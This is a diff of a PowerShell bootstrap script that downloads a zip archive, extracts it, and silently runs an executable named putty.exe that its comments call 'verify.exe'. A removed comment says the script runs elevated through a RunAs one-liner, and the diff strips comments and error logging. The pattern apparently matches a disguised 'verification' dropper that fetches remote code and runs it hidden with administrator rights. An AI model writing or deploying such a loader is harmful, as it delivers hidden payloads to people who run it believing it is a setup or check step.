@@ -10,38 +10,31 @@ $logPath = Join-Path $env:TEMP ("setup-" + $rand + ".log")
 Start-Transcript -Path $logPath -Append | Out-Null
 
 try {
-  # (We are already elevated because the one-liner used -Verb RunAs)
   New-Item -ItemType Directory -Path $workDir | Out-Null
 
   Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
   Expand-Archive -Path $zipPath -DestinationPath $workDir -Force
   Remove-Item $zipPath -Force
 
-  $runDir = Join-Path $workDir 'setup-1'
+  $runDir = Join-Path $workDir 'safe-main'
   if (!(Test-Path $runDir)) { throw "Expected folder not found: $runDir" }
 
-  # EXAMPLE A: run verify.bat (hidden)
+  # Example A: verify.bat
   #$bat = Join-Path $runDir 'verify.bat'
   #if (Test-Path $bat) {
   #  Start-Process -FilePath 'cmd.exe' -WindowStyle Hidden -ArgumentList '/c', "`"$bat`"" -Wait
-  #} else {
-  #  "verify.bat not found at: $bat" | Out-File -FilePath $logPath -Append
   #}
 
-  # EXAMPLE B: run verify.exe (hidden)
+  # Example B: verify.exe
   $exe = Join-Path $runDir 'putty.exe'
   if (Test-Path $exe) {
-    # Add silent args if needed: -ArgumentList '/quiet','/norestart'
     Start-Process -FilePath $exe -WindowStyle Hidden -Wait
-  } else {
-    "verify.exe not found at: $exe" | Out-File -FilePath $logPath -Append
   }
 
 } catch {
   "BOOTSTRAP FAILED: $($_.Exception.Message)" | Out-File -FilePath $logPath -Append
 } finally {
   Stop-Transcript | Out-Null
-
   # Optional cleanup:
   # try { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue } catch {}
 }
